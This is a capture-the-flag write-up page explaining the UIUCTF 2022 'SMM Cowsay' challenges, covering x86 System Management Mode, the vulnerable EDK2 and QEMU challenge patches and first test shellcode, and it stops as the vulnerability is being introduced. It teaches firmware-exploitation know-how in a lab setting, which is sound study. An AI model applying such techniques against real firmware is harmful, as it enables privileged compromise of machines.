<!DOCTYPE html><html lang="en" data-astro-cid-dxom2xcl> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v4.16.18"><!-- Font preloads --><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://localhost:3000/writeups/2022-08-15-uiuctf-2022-smm-cowsay/"><!-- Primary Meta Tags --><title>UIUCTF 2022 - SMM Cowsay 1, 2, 3</title><meta name="title" content="UIUCTF 2022 - SMM Cowsay 1, 2, 3"><meta name="description" content="ROP shenanigans to pwn UEFI drivers running in x86 System Management Mode"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://localhost:3000/writeups/2022-08-15-uiuctf-2022-smm-cowsay/"><meta property="og:title" content="UIUCTF 2022 - SMM Cowsay 1, 2, 3"><meta property="og:description" content="ROP shenanigans to pwn UEFI drivers running in x86 System Management Mode"><meta property="og:image" content="https://localhost:3000/blog-placeholder-1.jpg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://localhost:3000/writeups/2022-08-15-uiuctf-2022-smm-cowsay/"><meta property="twitter:title" content="UIUCTF 2022 - SMM Cowsay 1, 2, 3"><meta property="twitter:description" content="ROP shenanigans to pwn UEFI drivers running in x86 System Management Mode"><meta property="twitter:image" content="https://localhost:3000/blog-placeholder-1.jpg"><style>:root{--accent: #fea819;--accent-dark: #ac7010}@font-face{font-family:Atkinson;src:url(/fonts/atkinson-regular.woff) format("woff");font-weight:400;font-style:normal;font-display:swap}@font-face{font-family:Atkinson;src:url(/fonts/atkinson-bold.woff) format("woff");font-weight:700;font-style:normal;font-display:swap}body{font-family:Atkinson,sans-serif;margin:0;padding:0;text-align:left;background:#171717 no-repeat;background-size:100% 600px;word-wrap:break-word;overflow-wrap:break-word;color:#aaa;font-size:20px;line-height:1.7}main{width:720px;max-width:calc(100% - 2em);margin:auto;padding:3em 1em}h1,h2,h3,h4,h5,h6{margin:0 0 .5rem;color:#fff;line-height:1.2}h1{font-size:3.052em}h2{font-size:2.441em}h3{font-size:1.953em}h4{font-size:1.563em}h5{font-size:1.25em}strong,b{font-weight:700}a,a:hover{color:var(--accent)}p{margin-bottom:1em}.prose p{margin-bottom:2em}textarea{width:100%;font-size:16px}input{font-size:16px}table{width:100%}img{max-width:100%;height:auto;border-radius:8px}code{padding:2px 5px;background-color:#1f1f1f;border-radius:2px}pre{padding:1.5em;border-radius:8px}pre>code{all:unset;font-size:.9em}blockquote{border-left:4px solid var(--accent);padding:0 0 0 20px;margin:0;font-size:1.333em}hr{border:none;border-top:1px solid #e9e9e9}@media (max-width: 720px){body{font-size:18px}main{padding:1em}}.sr-only{border:0;padding:0;margin:0;position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);clip-path:inset(50%);white-space:nowrap}a[data-astro-cid-eimmu3lg]{display:inline-block;text-decoration:none}a[data-astro-cid-eimmu3lg].active{font-weight:bolder;text-decoration:underline}header[data-astro-cid-3ef6ksr2]{margin:0;padding:0 1em;background:#1f1f1f;box-shadow:0 2px 8px rgba(var(--black),5%)}h2[data-astro-cid-3ef6ksr2]{margin:0;font-size:1em}h2[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2],h2[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2].active{text-decoration:none}nav[data-astro-cid-3ef6ksr2]{display:flex;align-items:center;justify-content:space-between}nav[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2]{padding:1em .5em;color:var(--black);border-bottom:4px solid transparent;text-decoration:none}nav[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2].active{text-decoration:none;border-bottom-color:var(--accent)}.social-links[data-astro-cid-3ef6ksr2],.social-links[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2]{display:flex}@media (max-width: 720px){.social-links[data-astro-cid-3ef6ksr2]{display:none}}footer[data-astro-cid-sz7xmlte]{padding:2em 1em 6em;background:linear-gradient(var(--gray-gradient)) no-repeat;color:rgb(var(--gray));text-align:center}.social-links[data-astro-cid-sz7xmlte]{display:flex;justify-content:center;gap:1em;margin-top:1em}.social-links[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]{text-decoration:none;color:rgb(var(--gray))}.social-links[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]:hover{color:rgb(var(--gray-dark))}
main[data-astro-cid-dxom2xcl]{width:calc(100% - 2em);max-width:100%;margin:0}.hero-image[data-astro-cid-dxom2xcl]{width:100%}.hero-image[data-astro-cid-dxom2xcl] img[data-astro-cid-dxom2xcl]{display:block;margin:0 auto;border-radius:12px;box-shadow:var(--box-shadow)}.prose[data-astro-cid-dxom2xcl]{width:75%;max-width:calc(100% - 2em);margin:auto;padding:1em;color:rgb(var(--gray-dark))}.title[data-astro-cid-dxom2xcl]{margin-bottom:1em;padding:1em 0;text-align:center;line-height:1}.title[data-astro-cid-dxom2xcl] h1[data-astro-cid-dxom2xcl]{margin:0 0 .5em}.date[data-astro-cid-dxom2xcl]{margin-bottom:.5em;color:rgb(var(--gray))}.last-updated-on[data-astro-cid-dxom2xcl]{font-style:italic}
</style></head> <body data-astro-cid-dxom2xcl> <header data-astro-cid-3ef6ksr2> <nav data-astro-cid-3ef6ksr2> <a href="/" style="padding: 1rem 0 0 0;" data-astro-cid-3ef6ksr2> <img src="/new_tower_logo.png" alt="Tower of Hanoi Logo" width="50rem" height="50rem" style="border-radius: 0;" data-astro-cid-3ef6ksr2> </a> <div class="internal-links" data-astro-cid-3ef6ksr2> <a href="/" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Home </a>  <a href="/blog" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Blogposts </a>  <a href="/writeups" class="active" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Writeups </a>  <a href="/about" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> About </a>  </div> <div class="social-links" data-astro-cid-3ef6ksr2> <a href="https://x.com/towerofhanoi" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Follow Tower of Hanoi on Twitter</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" data-astro-cid-3ef6ksr2></path></svg> </a> <a href="https://github.com/towerofhanoi" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Go to Tower of Hanoi's GitHub repo</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-3ef6ksr2></path></svg> </a> <a href="https://ctftime.org/team/300" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Go to Tower of Hanoi's CTF Time page</span> <svg viewBox="0 0 16 16" width="32" height="32" data-astro-cid-3ef6ksr2> <path fill="currentColor" d="M 0,0 H 16 V 16 H 0 L 4.7205698,7.7838485 Z" data-astro-cid-3ef6ksr2></path> </svg> </a> </div> </nav> </header>  <main data-astro-cid-dxom2xcl> <article data-astro-cid-dxom2xcl> <div class="hero-image" data-astro-cid-dxom2xcl> <img width="720" height="360" src="/writeup_images/uiuctf22.png" alt="" data-astro-cid-dxom2xcl> </div> <div class="prose" data-astro-cid-dxom2xcl> <div class="title" data-astro-cid-dxom2xcl> <div class="date" data-astro-cid-dxom2xcl> <time datetime="2022-08-15T11:37:00.000Z"> Aug 15, 2022 </time>  </div> <h1 data-astro-cid-dxom2xcl>UIUCTF 2022 - SMM Cowsay 1, 2, 3</h1> <h3 data-astro-cid-dxom2xcl> by Marco Bonelli - @mebeim</h3> <hr data-astro-cid-dxom2xcl> </div>  <p><strong>Jump to</strong>: <a href="#smm-cowsay-1">SMM Cowsay 1</a>, <a href="#smm-cowsay-2">SMM Cowsay 2</a>, <a href="#smm-cowsay-3">SMM Cowsay 3</a>.</p>
<hr>
<p>There was a pretty interesting “systems” category in <a href="https://ctftime.org/event/1600/">UIUCTF 2022</a>. In
this category, three challenges of increasing difficulty called “SMM Cowsay”
caught my eye. Unfortunately, I wasn’t able to solve them before the end of the
CTF, but I found them so interesting that I kept going at them after the CTF,
and <a href="https://twitter.com/MeBeiM/status/1554849894237609985">ended up solving all three</a> after studying them enough time.</p>
<p>Huge shout out to the author of these awesome challenges: <a href="https://github.com/zhuyifei1999">YiFei Zhu</a>,
who was also so kind to award me the small bounty of $50 posted on the first
blood for SMM Cowsay 3, which had remained unsolved after the CTF ended. All the
challenge files should still be up in the
<a href="https://2022.uiuc.tf/challenges">archived UIUCTF 2022 website</a>.</p>
<h2 id="background-on-system-management-mode">Background on System Management Mode</h2>
<p><a href="https://en.wikipedia.org/wiki/System_Management_Mode">System Management Mode</a> is documented in <a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">Intel SDM</a>,
Volume 3C, Chapter 30. It is the operating mode with highest privilege, and
sometimes referred to as “ring -2”. This mode has higher privilege than an
OS/kernel (ring 0) and even an hypervisor (ring -1). It can only be entered
through a System Management Interrupt (SMI), it has a separate address space
completely invisible to other operating modes, and full access to all physical
memory, MSRs, control registers etc.</p>
<p>A special region of physical memory called SMRAM is the home of the SMI handler
code and also contains a save state area where the CPU state (most importantly
the values of all registers) is saved to and restored from when entering/exiting
SMM.</p>
<p>Upon receing an SMI and entering SMM the SMI handler is executed. It initially
runs code in a weird real-mode-on-steroids operating mode, but can switch to
32-bit protected mode, enable paging (and PAE), and even switch to 64-bit long
mode (and use 5-level paging). After doing what’s needed, the SMI handler can
exit SMM with <a href="https://www.felixcloutier.com/x86/rsm">the <code>RSM</code> instruction</a>, which restores the CPU state
from the save state area in SMRAM.</p>
<p>SMIs can be triggered by software using IO port <code>0xB2</code>, and this functionality
can be used to implement some controlled mechanism of communication between SMM
and non-SMM code.</p>
<p>This is more or less enough beckground on SMM to understand what’s going on, and
I will explain the rest along the way. In any case, you can always check the
manuals I link. Now let’s get into the challenges!</p>
<hr>
<h1 id="smm-cowsay-1">SMM Cowsay 1</h1>
<p><strong>Full exploit</strong>: <a href="https://github.com/TowerofHanoi/towerofhanoi.github.io/blob/master/writeup_files/uiuctf-2022_smm-cowsay/expl_smm_cowasy_1.py">expl_smm_cowasy_1.py</a></p>
<p>The challenge description states:</p>
<blockquote>
<p>One of our engineers thought it would be a good idea to write Cowsay inside
SMM. Then someone outside read out the trade secret (a.k.a. flag) stored at
physical address 0x44440000, and since it could only be read from SMM, that
can only mean one thing: it… was a horrible idea.</p>
</blockquote>
<p>The goal of the challenge seems simple enough: read the flag which is at
physical address <code>0x44440000</code> <em>somehow</em>.</p>
<p>The files we are given contain:</p>
<ul>
<li>The built challenge binaries together with a <code>qemu-system-x86_64</code> binary and a
startup script that supplies the needed arguments to run the challenge
locally.</li>
<li>Thee source code of the challenge as a series of patches to <a href="https://github.com/tianocore/edk2">EDK2</a>
(the de-facto standard UEFI implementation) and <a href="https://github.com/qemu/qemu">QEMU</a>, along with a
<code>Dockerfile</code> to apply them and build everything.</li>
<li>EDK2 build artifacts (i.e. binaries with useful debug symbols) of the build
done for the challenge running remotely.</li>
</ul>
<p>Running the challenge, we are greeted with the following message:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>UEFI Interactive Shell v2.2</span></span>
<span class="line"><span>EDK II</span></span>
<span class="line"><span>UEFI v2.70 (EDK II, 0x00010000)</span></span>
<span class="line"><span>Shell> binexec</span></span>
<span class="line"><span> ____________________________________________________________________</span></span>
<span class="line"><span>/ Welcome to binexec!                                                \</span></span>
<span class="line"><span>| Type some shellcode in hex and I'll run it!                        |</span></span>
<span class="line"><span>|                                                                    |</span></span>
<span class="line"><span>| Type the word 'done' on a seperate line and press enter to execute |</span></span>
<span class="line"><span>\ Type 'exit' on a seperate line and press enter to quit the program /</span></span>
<span class="line"><span> --------------------------------------------------------------------</span></span>
<span class="line"><span>                    \   ^__^</span></span>
<span class="line"><span>                     \  (oo)\_______</span></span>
<span class="line"><span>                        (__)\       )\/\</span></span>
<span class="line"><span>                            ||----w |</span></span>
<span class="line"><span>                            ||     ||</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Address of SystemTable: 0x00000000069EE018</span></span>
<span class="line"><span>Address where I'm gonna run your code: 0x000000000517D100</span></span>
<span class="line"><span></span></span></code></pre>
<h2 id="what-are-we-dealing-with">What are we dealing with?</h2>
<h3 id="edk2-patches">EDK2 patches</h3>
<p>The EDK2 patch <code>0003-SmmCowsay-Vulnerable-Cowsay.patch</code> implements a UEFI SMM
driver called <code>SmmCowsay.efi</code>: this driver will run in SMM, and registers an
handler (through <a href="https://github.com/tianocore/edk2/blob/7c0ad2c33810ead45b7919f8f8d0e282dae52e71/MdeModulePkg/Core/PiSmmCore/Smi.c#L213">the <code>SmiHandlerRegister</code> function</a>)
to be executed in SMM that prints text much like the <a href="https://manned.org/cowsay.1">cowsay</a> Linux
command does:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#DBD7CAEE">  Status </span><span style="color:#666666">=</span><span style="color:#BD976A"> gSmst</span><span style="color:#CB7676">-></span><span style="color:#80A665">SmiHandlerRegister</span><span style="color:#666666"> (</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    SmmCowsayHandler</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#CB7676">                    &#x26;</span><span style="color:#BD976A">gEfiSmmCowsayCommunicationGuid</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#CB7676">                    &#x26;</span><span style="color:#DBD7CAEE">DispatchHandle</span></span>
<span class="line"><span style="color:#666666">                    );</span></span>
<span class="line"></span></code></pre>
<p>When a SMI happens, the SMI handler registered by EDK2 goes through a linked
list of registered handlers and chooses the appropriate one to run.</p>
<p>The next patch <code>0004-Add-UEFI-Binexec.patch</code> implements a normal UEFI driver
called <code>Binexec.efi</code> which will interact both with us (through console
input/output) and with the <code>SmmCowsay.efi</code> driver to print the greeting banner
we see above when running challenge.</p>
<p>In order to communicate with the <code>SmmCowsay.efi</code> driver, <code>Binexec.efi</code> sends a
“message” through
<a href="https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdeModulePkg/Core/PiSmmCore/PiSmmIpl.c#L110">the <code>->Communicate()</code> method</a> provided by
<a href="https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdeModulePkg/Core/PiSmmCore/PiSmmIpl.c#L267">the <code>EFI_SMM_COMMUNICATION_PROTOCOL</code> struct</a>:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#DBD7CAEE">    mSmmCommunication</span><span style="color:#CB7676">-></span><span style="color:#80A665">Communicate</span><span style="color:#666666">(</span></span>
<span class="line"><span style="color:#DBD7CAEE">        mSmmCommunication</span><span style="color:#666666">,</span><span style="color:#758575DD"> // "THIS" pointer</span></span>
<span class="line"><span style="color:#DBD7CAEE">        Buffer</span><span style="color:#666666">,</span><span style="color:#758575DD">            // Pointer to message of type EFI_SMM_COMMUNICATE_HEADER</span></span>
<span class="line"><span style="color:#4D9375">        NULL</span></span>
<span class="line"><span style="color:#666666">    );</span></span>
<span class="line"></span></code></pre>
<p>This function <a href="https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdeModulePkg/Core/PiSmmCore/PiSmmIpl.c#L547">copies the message</a> in a global variable and
triggers a software SMI to handle it. The message includes the GUID of the SMM
handler we want to communicate with, which is searched for in the linked list of
registered handlers when entering SMM.</p>
<p>The <code>Binexec.efi</code> driver will simply run in a loop asking us for some code in
hexadecimal form, copying it into an RWX memory area, and then jumping into it
(saving/restoring registers with an assembly wrapper). This means that we have
the ability to run arbitrary code inside an UEFI driver, which runs in
Supervisor Mode (a.k.a. ring 0).</p>
<h3 id="qemu-patch">QEMU patch</h3>
<p>The QEMU patch implements a custom MMIO device that simply reads a <code>region4</code>
file on the host machine and creates an MMIO memory region starting at physical
address <code>0x44440000</code> of size <code>0x1000</code> holding the content of this file. This
means that accessing physical memory at address <code>0x44440000</code> will invoke the
QEMU device read/write operations (<code>MemoryRegionOps</code>), which will decide how to
handle the memory read/write.</p>
<p>The read operation handler (<code>uiuctfmmio_region4_read_with_attrs()</code>) performs a
check ensuring that the read has
<a href="https://github.com/qemu/qemu/blob/v7.0.0/include/exec/memattrs.h#L35">the <code>.secure</code> flag set in the <code>MemTxAttrs</code> structure</a> passed
to the function, meaning that the read was issued from SMM. If this is not the
case, a fake flag is returned instead:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#CB7676">static</span><span style="color:#DBD7CAEE"> MemTxResult </span><span style="color:#80A665">uiuctfmmio_region4_read_with_attrs</span><span style="color:#666666">(</span></span>
<span class="line"><span style="color:#CB7676">    void</span><span style="color:#CB7676"> *</span><span style="color:#BD976A">opaque</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> hwaddr </span><span style="color:#BD976A">addr</span><span style="color:#666666">,</span><span style="color:#CB7676"> uint64_t</span><span style="color:#CB7676"> *</span><span style="color:#BD976A">val</span><span style="color:#666666">,</span><span style="color:#CB7676"> unsigned</span><span style="color:#BD976A"> size</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> MemTxAttrs </span><span style="color:#BD976A">attrs</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#666666">{</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#666666"> (</span><span style="color:#CB7676">!</span><span style="color:#BD976A">attrs</span><span style="color:#666666">.</span><span style="color:#BD976A">secure</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#80A665">        uiuctfmmio_do_read</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">addr</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> val</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> size</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> nice_try_msg</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> nice_try_len</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">    else</span></span>
<span class="line"><span style="color:#80A665">        uiuctfmmio_do_read</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">addr</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> val</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> size</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> region4_msg</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> region4_len</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> MEMTX_OK</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<h3 id="efi-system-table">EFI System Table</h3>
<p>We are also given the address of a <code>SystemTable</code> and the address where our
shellcode will copied (and ran). The <a href="https://uefi.org/specifications">UEFI Specification</a>, on which I
probably spent more time than needed, contains all the information we need to
understand what this is about.</p>
<p>This <code>SystemTable</code> is the <a href="https://edk2-docs.gitbook.io/edk-ii-uefi-driver-writer-s-guide/3_foundation/33_uefi_system_table"><em>EFI System Table</em></a>, which is a
strucure containing all the information needed to do literally <em>anything</em> in an
UEFI driver. It holds a bunch of pointers to other structures, which in term
hold another bunch of pointers to API methods, configuration variables, and so
on.</p>
<p>What we are interested in for now is the <code>BootServices</code> field of the EFI System
Table, which holds a pointer to the <em>EFI Boot Services Table</em> (see chapter 4.4
of the <a href="https://uefi.org/sites/default/files/resources/UEFI_Spec_2_9_2021_03_18.pdf">UEFI Spec v2.9</a>): another table holding a bunch of useful
function pointers for different UEFI APIs.</p>
<h2 id="lets-run-some-uefi-shellcode">Let’s run some UEFI shellcode</h2>
<p><em>Ok, technically speaking it’s not shellcode if it doesn’t spawn a shell… but
bear with me on the terminology here :’).</em> We can test the functionality of the
<code>Binexec</code> driver by assembling and running a simple <code>mov eax, 0xdeadbeef</code>. I am
using <a href="https://github.com/Gallopsled/pwntools">pwntools</a> to quickly assemble the code from a shell.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$ pwn asm -c amd64 'mov eax, 0xdeadbeef'</span></span>
<span class="line"><span>b8efbeadde</span></span>
<span class="line"><span>----- snip -----</span></span>
<span class="line"><span></span></span>
<span class="line"><span>b8efbeadde</span></span>
<span class="line"><span>done</span></span>
<span class="line"><span>Running...</span></span>
<span class="line"><span>RAX: 0x00000000DEADBEEF RBX: 0x00000000069EE018 RCX: 0x0000000000000000</span></span>
<span class="line"><span>RDX: 0x000000000517CA1C RSI: 0x000000000517D100 RDI: 0x0000000000000005</span></span>
<span class="line"><span>RBP: 0x000000000000000F R08: 0x0000000000000001 R09: 0x000000000517CA2C</span></span>
<span class="line"><span>R10: 0x0000000000000000 R11: 0x000000000517BFA6 R12: 0x0000000005508998</span></span>
<span class="line"><span>R13: 0x0000000000000000 R14: 0x0000000006F9C420 R15: 0x0000000006F9C428</span></span>
<span class="line"><span>Done! Type more code</span></span>
<span class="line"><span></span></span></code></pre>
<p>The driver works as intended and we also get a nice register dump after the
shellcode finishes execution… well easy! Let’s try to read the flag into a
register then:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$ pwn asm -c amd64 'mov rax, qword ptr [0x44440000]; mov rbx, qword ptr [0x44440008]'</span></span>
<span class="line"><span>488b042500004444488b1c2508004444</span></span>
<span class="line"><span>----- snip -----</span></span>
<span class="line"><span></span></span>
<span class="line"><span>488b042500004444488b1c2508004444</span></span>
<span class="line"><span>done</span></span>
<span class="line"><span>Running...</span></span>
<span class="line"><span>RAX: 0x6E7B667463756975 RBX: 0x2179727420656369 RCX: 0x0000000000000000</span></span>
<span class="line"><span>...</span></span>
<span class="line"><span>----- snip -----</span></span>
<span class="line"><span></span></span>
<span class="line"><span>$ python3</span></span>
<span class="line"><span>>>> (0x6E7B667463756975).to_bytes(8, "little")</span></span>
<span class="line"><span>b'uiuctf{n'</span></span>
<span class="line"><span>>>> (0x2179727420656369).to_bytes(8, "little")</span></span>
<span class="line"><span>b'ice try!'</span></span>
<span class="line"><span></span></span></code></pre>
<p>Ok, the QEMU patch works as expected: the MMIO driver saw that we are not
reading memory from System Management Mode and gave us the fake flag. Even
though we do have access to physical memory, we still cannot read the flag by
running code in the <code>Binexec.efi</code> driver. We need to read it from System
Management Mode.</p>
<h2 id="the-vulnerability">The vulnerability</h2>
<p>Looking at the source code in the patch implementing <code>Binexec.efi</code>, we can see
how the communication with <code>SmmCowsay.efi</code> works in order to print the greeting
banner:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#DBD7CAEE">VOID</span></span>
<span class="line"><span style="color:#80A665">Cowsay</span><span style="color:#666666"> (</span></span>
<span class="line"><span style="color:#DBD7CAEE">    IN CONST CHAR16 </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">Message</span></span>
<span class="line"><span style="color:#666666">    )</span></span>
<span class="line"><span style="color:#666666">{</span></span>
<span class="line"><span style="color:#DBD7CAEE">    EFI_SMM_COMMUNICATE_HEADER </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">Buffer</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">    Buffer </span><span style="color:#666666">=</span><span style="color:#80A665"> AllocateRuntimeZeroPool</span><span style="color:#666666">(</span><span style="color:#CB7676">sizeof</span><span style="color:#666666">(</span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">Buffer</span><span style="color:#666666">)</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> sizeof</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">CHAR16 </span><span style="color:#CB7676">*</span><span style="color:#666666">));</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#666666"> (</span><span style="color:#CB7676">!</span><span style="color:#DBD7CAEE">Buffer</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#BD976A">    Buffer</span><span style="color:#666666">-></span><span style="color:#BD976A">HeaderGuid</span><span style="color:#666666"> =</span><span style="color:#BD976A"> gEfiSmmCowsayCommunicationGuid</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#BD976A">    Buffer</span><span style="color:#666666">-></span><span style="color:#BD976A">MessageLength</span><span style="color:#666666"> =</span><span style="color:#CB7676"> sizeof</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">CHAR16 </span><span style="color:#CB7676">*</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#CB7676">    *</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">CONST CHAR16 </span><span style="color:#CB7676">**</span><span style="color:#666666">)</span><span style="color:#CB7676">&#x26;</span><span style="color:#BD976A">Buffer</span><span style="color:#666666">-></span><span style="color:#BD976A">Data</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> Message</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#BD976A">    mSmmCommunication</span><span style="color:#666666">-></span><span style="color:#80A665">Communicate</span><span style="color:#666666">(</span></span>
<span class="line"><span style="color:#DBD7CAEE">        mSmmCommunication</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#DBD7CAEE">        Buffer</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#4D9375">        NULL</span></span>
<span class="line"><span style="color:#666666">    );</span></span>
<span class="line"></span>
<span class="line"><span style="color:#80A665">    FreePool</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">Buffer</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>As already said above, normal UEFI drivers can communicate through this
“SmmCommunication” protocol with SMM UEFI drivers that have an appropriate
handler registered, and data is passed through a pointer to a
<code>EFI_SMM_COMMUNICATE_HEADER</code> structure:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#4D9375">typedef</span><span style="color:#CB7676"> struct</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">  EFI_GUID HeaderGuid</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">  UINTN MessageLength</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">  UINT8 </span><span style="color:#BD976A">Data</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">ANYSIZE_ARRAY</span><span style="color:#666666">];</span></span>
<span class="line"><span style="color:#666666">}</span><span style="color:#DBD7CAEE"> EFI_SMM_COMMUNICATE_HEADER</span><span style="color:#666666">;</span></span>
<span class="line"></span></code></pre>
<p>This simple structure should contain the GUID of the SMM driver we want to
communicate with (in this case the GUID registered by <code>SmmCowsay</code>), a message
length, and a flexible array member of <code>MessageLength</code> bytes containing the
actual message.</p>
<p>The imporatant thing to notice here is this line:</p>
